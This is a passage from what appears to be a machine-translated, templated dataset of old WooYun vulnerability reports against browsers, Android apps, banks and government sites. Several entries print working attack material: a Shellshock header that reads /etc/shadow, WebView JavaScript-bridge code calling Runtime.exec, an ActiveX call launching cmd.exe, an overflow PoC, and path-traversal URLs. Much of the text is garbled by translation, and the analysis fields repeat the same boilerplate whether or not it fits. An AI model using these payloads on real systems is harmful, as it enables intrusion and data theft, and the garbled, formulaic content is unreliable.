**Details**: a certain textAPPAndroid clientremote code execution,version:3.4.3a certain textAPPis oneusertranslated textclient.hasvulnerabilityinterface:TTAndroidObjectcheckmethod:directlyinaddresstextinputchecktext(https://example.com/[redacted]

**POC**: securitytextandtextcloudtextvulnerabilitycheckservice

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-072339] textbrowserformrequest forgerywebsitevulnerability
**Vendor**: textbrowser | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textmobile phonebrowser [IP redacted]63testmobile phoneasAndroid4.4.2

**POC**: payload:<script>var k=1;window.onblur=s();document.getElementById("xxx").submit();function s(){if(k>1){window.open("javascript:document.write(3)","lll");}k++;}function s2(){window.open("javascript:document.write(3)","lll");window.onblur=function(){};}</script><body><form id="xxx" action="https://www

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0108355] a certain search enginebrowserAndroidremotedosattack
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: loadundertextremotewebpage,copycometextenteronetextexploit,butoneopenaftera certain search enginebrowserthentext,thenwhenisremotedenial of serviceattack.

**POC**: ina certain search enginebrowserinsideloadundertextwebpage,then cantextitsremotedenial of servicepoc:<html><title>test baidu browser</title><body><script>function readfile(id) {alert(document.getElementById(id).contentDocument.body.firstChild.innerHTML);}</script>load 1...<iframe id='iframe1' src='content://com.letv.datastatistics.db.StatisContentProvider.baidubrowser/'

**Bypass**: Direct exploitation

**Fix**: textcontentprotocolcalllocalfile
---

---
### [wooyun-2012-016446] VNPlayerbuffer overflowvulnerability
**Vendor**: VNPlayer | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: programfor.aplfilecontentnottranslated text,textmaliciousfilecausingbuffer overflow,execute arbitrarycode.pocfilecontent:0x53, 0x74, 0x61, 0x72, 0x74, 0x20, 0x42, 0x6C,0x6F, 0x63, 0x6B, 0x3D, 0x20, 0x46, 0x69, 0x6E,0x69, 0x73, 0x68, 0x20, 0x42, 0x6C, 0x6F, 0x63,0x6B, 0x3D, 0x5B, 0x4D, 0x6F, 0x6E, 0x6B, 0x65,0x79, 0x27, 0x73, 0x20, 0x41, 0x75, 0x64, 0x69,0x6F, 0x20, 0x49, 0x6D, 0x61, 0x67, 0x65, 0x20,0x4C, 0x69, 0x6E, 0x6B, 0x20, 0x46, 0x69, 0x6C,0x65, 0x5D, 0x49, 0x6D,

**POC**: textpocfiletocan executeprogramvulnerabilitytrigger,startcalc

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-03940] text3 Typetextusetextvulnerability
**Vendor**: text | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: DLL: MxWebkit.dll (ver [IP redacted])constructas followshtmlfile:<html><math xmlns="https://example.com/[redacted]"><input></input></math></html>usetextopenthishtmlfile,putcausingsub_2433900functioncall.sub_2433900{loc_24339C0:push    ebxlea     eax, [esp+34h+var_10]push    eaxlea     ecx, [esp+38h+var_24]call    sub_240EA70;obtainonetranslated text,textvar_10+4location.thistextlargetextas0x38text...02433B06:mov     ecx, [esp+30h+var_20]call    sub_1FD49A0;textquestiontextobtaintextmov     ecx

**POC**: MxWebkit!CreateCookieObj+0x29a5a6:668049a6 8b01            mov     eax,dword ptr [ecx]  ds:0023:feeefeee=????????3:020> uMxWebkit!CreateCookieObj+0x29a5a6:668049a6 8b01            mov     eax,dword ptr [ecx]668049a8 8b5024          mov     edx,dword ptr [eax+24h]668049ab ffe2            jmp     edx

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0106116] textclienthas remote code execution vulnerability
**Vendor**: text | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: directlytextquestionpagehasone locationinterfaceissue

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-090594] a certain security vendorwan optimization controllertranslated textcontroltexthasbashvulnerability
**Vendor**: a certain security vendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: requestget /cgi-bin/login.cgiPragma: no-cacheCache-Control: no-cacheAcunetix-Aspect: enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsHost: xxxConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: () { :;}; echo  `/bin/cat /etc/shadow`Accept: */*getHTTP/1.0 200 OKDate: Wed, 07 Jan 2015 15:57:01 GMTServer: WocBoa/2.04.24X-Frame-Option

**POC**: get /cgi-bin/login.cgiPragma: no-cacheCache-Control: no-cacheAcunetix-Aspect: enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsHost: xxxConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: () { :;}; echo  `/bin/cat /etc/shadow`A

**Bypass**: Direct exploitation

**Fix**: ..
---

---
### [wooyun-2016-0170106] a certain city commercial banka systemhasweblogicdeserializationvulnerability
**Vendor**: a certain city commercial bank | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: hasissuewebsiteistextlinetranslated textwebsite:http://**.**.**.**:8080nmaptextunder,foundtextweblogic,directlyontooltest,undertextthennottext.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: translated text,translated textfortextsystem,textenvironmentalltextcheck!banktextsingletextsecuritytextnottranslated text!
---

---
### [wooyun-2015-0162803] translated textJavadeserializationvulnerability(textserver)
**Vendor**: translated text | **Year**: 2015 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: IP:**.**.**.**createonemanagementtextuserusernamed :temp$password :123456serverinsidetexthastextdatadatabasebackupetc.otherinformation...nottranslated text...text textistextreview

**POC**: IP:**.**.**.**createonemanagementtextuserusernamed :temp$password :123456serverinsidetexthastextdatadatabasebackupetc.otherinformation...nottranslated text...text textistextreviewgood

**Bypass**: Direct exploitation

**Fix**: ~reviewtext :P
---

---
### [wooyun-2014-079200] a certain telecom operatormobile phoneservice hallofficialandroidclienthastextone issuewebviewremote code execution vulnerability
**Vendor**: a certain telecom operator | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain telecom operatormobile phoneservice hallofficialandroidclient"servicetranslated text"pagehaswebviewremote code execution vulnerability. textcanthroughthisinterfaceexecute arbitrarymaliciouscode,textusercausetranslated text.

**POC**: intexthijack"textissue"page,replaceaswebviewvulnerabilitycheckpage:http://drops/wooyun.org/webview.htmlappearundertextinterface:sdkInterface

**Bypass**: Direct exploitation

**Fix**: canreference:https://example.com/[redacted]
---

---
### [wooyun-2016-0166759] a certain state taxvideointextpointtextsystemhasjavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textstate taxvideointextpointtextsystemhasjavadeserializationvulnerabilityvulnerabilityurl:**.**.**.**/1,rootpermissions2,checklook atIP

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: upgradeweblogic
---

---
### [wooyun-2014-049938] textbrowserremote code execution vulnerability
**Vendor**: textbrowser | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: browsercometextthis kind ofissuetextisneedpatchexportsearchBoxJavaBridge_seemsisrelated to the Google search box.inandroid 4.0mobile phoneontestactually exists,4.2versions abovenothasfunction execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}testpage:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: need to delete this interface,callremoveJavascriptInterfacemethodhttps://example.com/[redacted]
---

---
### [wooyun-2015-0141866] a certain video sitevideoPC clientremote code execution vulnerability(withvulnerabilityPOC)
**Vendor**: a certain video sitetext | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain video sitevideoPC clienthasDLLhijackvulnerability.whenweusea certain video sitevideoopenonevideotext(for exampleTest.mp4),LeTVLoader.exeprocesswilltryloadvideotextindirectoryd3dcompiler_43.dllord3dcompiler_46.dllfile.ifputvideofiletextmaliciousDLLfileputinsameonedirectory,packagesendtextvictim,victimtextafteropenvideothenwillaffected.

**POC**: text,downloadonelatest versioncopya certain video sitevideoclient(versionnumberas**.**.**.**),as shown belowtext:textinweneedtextonedllfile,code is as follows(parttranslated textproveDLLcanbeload):#include <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCESS_ATTACH:MessageBoxA(NULL,"DLL hijacking vulnerability detected.","Test",MB_ICONWARNING);b

**Bypass**: Direct exploitation

**Fix**: inLeTVLoader.exeprocessincallSetDllDirectory(""),putwhentextDLLtextdirectorysetastext.
---

---
### [wooyun-2014-050971] a certain translated textpacketremote code execution vulnerability(needonesometext)
**Vendor**: a certain e-commerce platform | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain translated textpacketremote code execution vulnerability,nottextpointthreelinkaftertexttogethertextuse,as paymenttextapphasthis kind ofissue,textisnotshouldtextfunction execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}exportsearchBoxJavaBridge_,isrelated to the Google search box.inandroid 4.2versions abovenothas.testpage:https://example.com/[redacted]

**POC**: WebActivitytextexport,buttextlinktextcontrolgood,needtexttomalicious pagepointbalancetranslated textaccountenterafterpoint88.taobao.comclickenter88.taobao.comafterpagetextunderofficialblog,enterbloglook attotextclickonetranslated textenter,insidetextpoint peoplecomment,(commentcanselftextoneurl),textcommenttext peopletextcloudcheckwebviewurlagainclickunder

**Bypass**: Direct exploitation

**Fix**: callremoveJavascriptInterfacemethoddeletetextsearchBoxJavaBridge_
---

---
### [wooyun-2016-0168814] a certain municipal government procurement sitehasJavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.a certain municipal government procurement sitehasjavadeserializationvulnerability,cancompromisedserver,execute arbitrarycommand2.address:**.**.**.**/   http://**.**.**.**/3.vulnerabilitytranslated textchecktextserverasWeblogicserver,foundhasJavadeserializationvulnerability,thenExecutionthreetextcommandas follows

**POC**: foundisrootadministratoruser,inchecklook atoneunderserverotherinformation

**Bypass**: Direct exploitation

**Fix**: upgradeapply patch,deletefile
---

---
### [wooyun-2013-038477] nationwidetranslated textserviceplatformhasgeneric remote code execution vulnerability
**Vendor**: Nationaltranslated texthandleinformationtext | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: networktexthttps://example.com/[redacted]   ontextsearchtextbaidu:translated textbaidu:inurl:indexopen.actiontextlinedirectoryassist    maintain   previewhttptranslated text<div class="sub_nav_bg"><span class="sub_nav_icon sub_nav_font">&nbsp

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0167607] textenvironmenttextone locationJAVAdeserialization
**Vendor**: a certain environmental protection company | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: **.**.**.**/

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: ............
---

---
### [wooyun-2015-0139662] textwpsloadOLEobjectofinsidetextnot initializedNo.onepart
**Vendor**: a certain softwareVendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textinsidetext,thisistranslated textbeforeinsidetranslated textinsidetranslated textafter,canlook atto,textinsidetextnotranslated text,textisesi+0x98text(translated text)(esi=textoneeax),textistranslated textinsidetextcontent,texthereetc.for0x006e006f.thentextaftertextheretranslated textfunctiontext(esi=textoneeax),againcalltextfunction,causingcrash.exploitmethod:exploitheap feng shuitranslated textwpsinsidetext,thencontrolnot initializedinsidetranslated text,textthenis0x006e006fhere,incrashtextthencantexteip.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: referenceMicrosofttext,forloadoleobjectenterlinetext,notisoleobjectnotload.
---

---
### [wooyun-2015-0160352] a certain telecom operatora provincialtranslated textsystemjavadeserializationvulnerabilityrootpermissions
**Vendor**: a certain telecom operator | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://**.**.**.**:7001

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-049937] UCbrowserHDversionremote code execution vulnerability
**Vendor**: UC Mobile | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: browsercometextthis kind ofissuetextisneedpatchexportsearchBoxJavaBridge_seemsisrelated to the Google search box.inandroid 4.0mobile phoneontestactually exists,4.2versions abovenothasfunction execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}testpage:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: need to delete this interface,callremoveJavascriptInterfacemethodhttps://example.com/[redacted]
---

---
### [wooyun-2016-0169030] telecomone locationIDCSbusiness systemjavadeserialization
**Vendor**: Beijing Telecom | **Year**: 2016 | **Type**:

**Meta-thinking**: Trigger signal: functional testing

**Insight**:  lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify -related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://[IP redacted]

**POC**: thenisthistextsingle

**Bypass**: Direct exploitation

**Fix**: insidetextcheck,thistranslated text
---

---
### [wooyun-2015-0115259] Xunleilook atlook atcomponentall versionsvulnerabilitycausingremote code executionplant malware
**Vendor**: Xunlei | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: copyvulnerabilitytextActiveX control,DapCtrl.2.3.7201.447.(595).dll componenttexttogethertestenvironment:testedWin7/xp + ie8/9 (hassomeenvironmenttext,shouldisall versionsuniversal)+Xunleilook atlook atplayerlatest versionthiscomponenthastextvulnerability,translated textseriousonetext.hastextwillputitstextagaintexton.DapCtrl.DapCtrlcontrolputmethodhastextfunctionality,itsinoneiscallplayertextputnetworkvideo.textforrestrictionnottext,causecantextlocalpathasExecutionexepath,Parameterstextcanarbitraryspecifiedtextnottranslated textforurlvar a = new ActiveXObject("DapCtrl.DapCtrl");  //callcontrola.put("SEXPLAYERS","C:\\windows\\system32\\cmd.exe"); // textExecutionfilea.put("SEXPLAY","/c notepad");  //Parameters

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: onetranslated textundertextusenottothisfunctionality,nottext
---

---
### [wooyun-2015-0100274] intranslated texthas remote code execution vulnerability
**Vendor**: intranslated text | **Year**: 2015 | **Type**: network design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: network design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify network design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Ihastext,textItext!-.-translated text!

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: nottext!
---

---
### [wooyun-2015-0164645] a certain rural commercial banka systemvadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: **.**.**.**:7011

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: buzhidao
---

---
### [wooyun-2015-0132922] a certain insurance companya systemhasfile traversal
**Vendor**: a certain insurance company | **Year**: 2015 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: has remote code execution vulnerabilitywebsite:https://example.com/[redacted]  https://example.com/[redacted]   jinPengCarNo=1&mobile=987-65-4329&personName=ipebyqfg&proposalType=../../../../../../WEB-INF/config.xml?Parameters: proposalTypethroughtextproposalTypevaluecanremote executioncommandif,Iinhereif,thentextsingletestprove vulnerabilityhas.itstext,intomcatinsidetext,wetranslated textdirectoryhasif,textcopyonputallconfigurationallcantextcome.againproveoneunder:textserverconfigurationfileIherethennottranslated text,itstextallcantextcomeconfiguration.thiswebsitetexthasonesomecross-site,youselftextcheck

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: filter
---

---
### [wooyun-2011-02197] textbrowserremote code execution vulnerability
**Vendor**: text | **Year**: 2011 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textbrowser2willuseabsolute pathloadieframe.dll,textIE6environmentundernoieframe.dll,putieframe.dllandHTMLwebpagefileputsameonedirectory,textbrowseropenwebpageafterputwillinjectionieframe.dll.

**POC**: testenvironment: IE6+xp sp3useUNCpathtextwebpagefile,as shown below:

**Bypass**: Direct exploitation

**Fix**: loadlibaryloadDLLpathtext:1. programpath2. system323. system4. windows5. programExecutionpath6. PATHenvironmentvariableusetextforpathtextdatabasefile,thenhascancancausingDLLhijackvulnerability.vulnerabilitysoftwareinnodatabasefileenvironment,usewebdavetc.methodUNCpathtextquestiontextfile,vulnerabilitysoftwaretexttoNo.5text
---

---
### [wooyun-2011-02751] a certain city commercial bankonline bankingcontrolhasbuffer overflowvulnerability
**Vendor**: a certain city commercial bank | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: online bankingcontrolpacketinWebDllPersonal.dllistranslated textsendusecometextusbkeycontrolitsinIsHaveInstalledfunctionhasbuffer overflowvulnerabilitySub IsHaveInstalled (ByVal strProductName  As String)

**POC**: <object classid='clsid:6CF4C18B-D93D-4866-9A80-8E87AB491057' id='target' /></object><script language='vbscript'>arg1=String(4116, "A")target.IsHaveInstalled arg1</script></job></package>Exception Code: ACCESS_VIOLATIONDisasm: 7C809823	LOCK XADD [ECX],EAX	(KERNEL32.dll)Seh Chain:---------------------

**Bypass**: Direct exploitation

**Fix**: restrictionvariablelength
---

---
### [wooyun-2015-0144933] a certain handletranslated textAPPAndroidclientuserdataplaintextstoreinlocaldatadatabasecanberemotesteal
**Vendor**: a certain financial technology company | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textcopytextinformation,bankSMSinformationetc.dataplaintextstoreinlocaldatadatabasefilein,textforclientprogramusedwebviewcomponent,textinAndroidtextforetc.for4.3systemversionmobile phoneonhaswebviewvulnerability,exploitthisvulnerabilitycanremotestealtextuselocaldatafile.

**POC**: textcopytextinformation,bankSMSetc.informationplaintextstoreinlocalwacai365.sofilein:storetextcopytextinformation:storebanksendcomeSMSinformation(clientprogramtextfortexttoSMSenterlinefilter,collectbanksendcomeSMSinformation):putmobile phonetextburpsettexthandletextclienttextservicetextcommunications,usewebviewvulnerabilitycheckcodereplaceservicetextreturnhtmldata,thistextclienttranslated textexposewebview JS interface object,thisobjectissystemexposeinterface:exploitexposeJS interface objectExecutioncommand,readlocalwacai365.sodatadatabasefile,putPOCcodereplaceservicetextreturnhtmldata:thistextclienttranslated textreadwacai365.sofilecontentcanputreadcontentsendtexttoremoteserver.webviewtext

**Bypass**: Direct exploitation

**Fix**: fordatastoredataencryptafteragainstore.forforwebviewvulnerability,canincodeintextremoveJavascriptInterface("searchBoxJavaBridge_"),webviewvulnerabilityDetailsreference:http://**.**.**.**/blog.htm?spm=**.**.**.**.UUt2Ay&i
---

---
### [wooyun-2016-0170571] Microsofta certain PC-sidesoftwaretwoentertextcodehijackvulnerability
**Vendor**: Microsoft | **Year**: 2016 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Visual Studio Code Version 0.10.6hasDLLandEXEhijackvulnerability.whenuseCodeopenfile(for exampletest.md)text,whentextdirectory(current directory)astest.mdtextindirectory.CodeinstarttexttryrunREG.exe(reg query HKLM\Software\Microsoft\SQMClient /v MachineId),textnospecifiedallpath,causingREG.execantextwhentextdirectoryload[1].ifattackerputtest.mdandreg.exeonetogethersend to user(for exampletranslated textpacket),thattextwhenuseropentest.mdtext,reg.exetextwillExecution.textCodetextloadonesomenothasDLL:CSUNSAPI.dll, swift.dll, nfhwcrhk.dll, SureWareHook.dll, aep.dll, atasi.dll, nuronssl.dll, ubsec.d

**POC**: openProcess Explorer,textCode.exeprocess,NAME NOT FOUNDresult,thencanfound thisvulnerability:

**Bypass**: Direct exploitation

**Fix**: usealladdress,callSetDllDirectory(""),putwhentextaddresssetastextuseaddress.
---

---
### [wooyun-2015-0104388] a certain browsertextQR codecode execution
**Vendor**: a certain Internet company | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: usea certain browsertextthisQR code,translated texttoa certain search enginesuccesstext

**POC**: usea certain browsertextthisQR code,translated texttoa certain search enginesuccesstext

**Bypass**: Direct exploitation

**Fix**: shouldputtextresultusetextcopyoutput
---

---
### [wooyun-2016-0167773] a certain municipal administration for industry and commerce bureaujavadeserialization/foundlarge amount oftrojans
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: addtextadmin backend,buttexthasjavadeserializationvulnerabilitytextlargetextallistrojans

**POC**: addtextadmin backend,buttexthasjavadeserializationvulnerabilitytextlargetextallistrojans

**Bypass**: Direct exploitation

**Fix**: Fix
---

---
### [wooyun-2014-064607] a certain aviation groupa certain sitearbitrary code execution
**Vendor**: a certain aviation group | **Year**: 2014 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain aviation groupa certain sitearbitrary code execution

**POC**: texta certain functionalityusedST2:https://example.com/[redacted]'-an'}).start().getInputStream())).readLine()}arbitrary code execution:

**Bypass**: Direct exploitation

**Fix**: upgradestruts2
---

---
### [wooyun-2015-0126273] translated textmain siteremotefile inclusionvulnerability(arbitrary code execution)
**Vendor**: translated text | **Year**: 2015 | **Type**: file inclusion

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: file inclusion lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify file inclusion-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: allow_url_include
---

---
### [wooyun-2011-02515] Ecmallall versionslocalfile inclusionvulnerability
**Vendor**: ShopEx | **Year**: 2011 | **Type**: file inclusion

**Meta-thinking**: Trigger signal: functional testing

**Insight**: file inclusion lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify file inclusion-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: eccore/ecmall.phpinsideif (!get_magic_quotes_gpc()){$_GET   = addslashes_deep($_GET);$_POST  = addslashes_deep($_POST);$_COOKIE= addslashes_deep($_COOKIE);}/* requestforward */$default_app = $config['default_app'] ? $config['default_app'] : 'default';$default_act = $config['default_act'] ? $config['default_act'] : 'index';$app    = isset($_REQUEST['app']) ? trim($_REQUEST['app']) : $default_app;$act    = isset($

**POC**: wooyun.org/index.php?app=../../../../../../../../../proc/self/environ%00wooyun.org

**Bypass**: Direct exploitation

**Fix**: notneednotneed
---

---
### [wooyun-2016-0168109] a provincialtranslated textmanagementinformationsystemjavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: **.**.**.**:7001/WebContent/

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: apply patch
---

---
### [wooyun-2014-085724] a certain telecom operatora certain platformpatch not timelytextarbitrary code execution
**Vendor**: a certain telecom operator | **Year**: 2014 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: address:http://[IP redacted]

**POC**: strutsvulnerabilityhas,notapply patch,notranslated texttelecomplatform,notagaintranslated text,textFix

**Bypass**: Direct exploitation

**Fix**: apply patch
---

---
### [wooyun-2012-08133] inCivil Aviation Administration of Chinasubsiteremote code execution vulnerability
**Vendor**: intextCivil Aviation Administration | **Year**: 2012 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: functional testing

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inCivil Aviation Administration of Chinasubsiteremote code execution vulnerabilitytranslated text,noenteronetexttesttextissendtext

